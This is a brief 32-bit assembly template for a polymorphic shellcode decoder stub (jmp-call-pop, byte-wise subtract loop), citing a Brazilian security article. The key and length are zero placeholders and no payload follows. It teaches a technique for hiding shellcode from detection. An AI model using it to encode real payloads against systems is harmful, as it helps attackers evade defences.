# http://chmodsecurity.com.br/artigo/20/shellcode-polimorficos-chamdos-motor-polymorphic.html
BITS 32
jmp short jmptrick // 
decoder:
pop esi
xor ecx,ecx
mov cl,0
loop:
sub byte [esi+ecx-1],0
dec cl
jnz loop
jmp short obfuscated_code
jmptrick:
call decoder
obfuscated_code:
